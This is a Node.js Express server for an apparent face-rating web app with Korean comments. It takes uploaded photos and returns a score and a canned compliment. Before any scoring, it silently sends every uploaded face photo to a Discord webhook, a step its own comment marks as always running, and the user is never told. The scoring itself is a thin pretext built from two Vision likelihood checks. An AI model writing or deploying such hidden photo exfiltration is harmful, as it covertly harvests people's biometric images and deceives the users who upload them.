import express from "express";
import multer from "multer";
import fs from "fs";
import fetch from "node-fetch";
import vision from "@google-cloud/vision";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Google Vision 클라이언트
const visionClient = new vision.ImageAnnotatorClient({
  credentials: JSON.parse(process.env.GOOGLE_VISION_API)
});

// 업로드 설정
const upload = multer({ dest: "uploads/" });

app.use(express.static("."));

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  // 1️⃣ 디스코드로 사진 전송 (항상 실행)
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath), {
      filename: "face.jpg",
      contentType: req.file.mimetype
    });

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.error("다시 시도");
  }

  // 2️⃣ Google Vision 얼굴 분석
  let score = 5;
  let comment = "얼굴 분석 실패";

  try {
    const [result] = await visionClient.faceDetection(filePath);
    const face = result.faceAnnotations[0];

    if (face) {
      // 간단한 점수 알고리즘
      score = Math.min(
        10,
        Math.max(
          1,
          Math.round(
            5 +
            (face.joyLikelihood === "VERY_LIKELY" ? 2 : 0) +
            (face.surpriseLikelihood === "LIKELY" ? 1 : 0)
          )
        )
      );

      comment = `전체적으로 균형 잡힌 인상이며 첫인상이 좋은 편입니다.`;
    }
  } catch (e) {
    console.error("Vision 실패:", e.message);
  }

  res.json({
    ok: true,
    score,
    comment
  });

  fs.unlink(filePath, () => {});
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
